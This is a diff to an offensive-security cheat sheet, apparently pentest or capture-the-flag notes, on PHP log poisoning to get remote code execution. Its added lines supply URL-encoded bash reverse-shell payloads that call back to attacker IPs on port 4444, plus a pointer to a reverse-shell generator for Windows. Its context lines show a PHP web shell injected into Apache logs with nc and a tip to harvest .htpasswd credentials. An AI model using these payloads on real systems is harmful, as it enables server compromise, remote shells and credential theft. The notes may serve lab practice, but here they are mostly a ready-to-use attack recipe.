@@ -2,8 +2,9 @@ For PHP RCE, you'll want to use a technique called `log poisoning`.
 
 ##### Required
 Access to files
-A log file (Usually `/var/log/apache2/access.log`)
+A log file (Usually `/var/log/apache2/access.log`), see #
 
+#### Linux
 ##### Important
 First, run 
 ```
@@ -12,8 +13,22 @@ First, run
 to get general information.
 If RCE doesn't work, try RFI (other vhosts on machine)
 If there is HTTP-BASIC-AUTH involved, check the `.htpasswd` file, it often contains credentials. (usually `/etc/apache2/.htpasswd`)
+##### Target files: 
+```
+/var/log/apache2/access.log
+Payload:
+	bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261%22 
+```
 
+#### Windows
+##### Target files: 
+```
+C:\xampp\apache\logs\access.log
+Payload:
+	https://www.revshells.com/ (Powershell base64 - URL encoded)
+```
 
+#### General
 Payload: 
 ```
 <?php system($_GET['test']);?>
@@ -27,6 +42,7 @@ First, you need to get the payload in the log system:
 ```
 nc IP PORT
 GET /'<?php system($_GET['rce']); ?>'
+test=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.241%2F4444%200%3E%261%22 
 ```
 
 If this does not work, set your User-Agent as the payload.
